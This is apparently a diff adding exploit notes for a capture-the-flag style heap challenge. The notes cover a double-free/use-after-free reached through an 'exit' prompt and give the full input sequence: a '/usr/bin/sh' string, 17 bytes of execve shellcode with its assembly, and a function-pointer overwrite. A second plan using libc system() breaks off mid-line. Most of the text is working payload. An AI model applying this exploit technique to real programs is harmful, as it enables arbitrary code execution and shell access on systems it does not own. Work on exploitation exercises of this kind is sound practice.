@@ -1,0 +1,34 @@
+exit->n and then exit causes a double-free
+abcdeabcdeabcdeabcdeabcde
+
+buf at 0x6032a0
+
+fgets does NOT terminate on null
+
+go through prompts to set up exploit| NAME\x0a4\x0an\x0a3\x0a
+(13) store /usr/bin/sh at buf[0]    | /usr/bin/sh\x0a\x00
+(17) store shellcode at buf[13]     | \xbf\xa0\x32\x60\x00\xbe\xb0\x32\x60\x00\xba\xb0\x32\x60\x00\x0f\x05
+(2)  pad to reach buf[32]           | \x00\x00
+store &buf[13] at buf[32]           | \xa0\x32\x60\x00\x00\x00\x00\x00
+
+NAME\x0a4\x0an\x0a3\x0a/usr/bin/sh\x0a\x00\xbf\xa0\x32\x60\x00\xbe\xb0\x32\x60\x00\xba\xb0\x32\x60\x00\x0f\x05\x00\x00\xa0\x32\x60\x00\x00\x00\x00\x00
+
+shellcode: 17 bytes
+    mov     rdi, 0x6032a0       ; arg0 (filename) -- stored in buf[0]
+    mov     rsi, 0x6032b0       ; arg1 (argv)
+    mov     rdx, 0x6032b0       ; arg2 (envp)
+    syscall
+    
+\xbf\xa0\x32\x60\x00\xbe\xb0\x32\x60\x00\xba\xb0\x32\x60\x00\x0f\x05
+
+
+
+
+-----------too complicated
+store &(buf[8]) at buf[0]
+store "usr/bin/sh" at buf[8]
+store &clib->system() at buf[32]
+1. enter name
+2. do exit->n. this frees the buf, allowing malloc to assign to it
+3. do UAF echo (3): input 24 bytes, then 8 byte pointer to clib 'system'
+4. do UAF echo (3): input  -> echo(3) will call system(
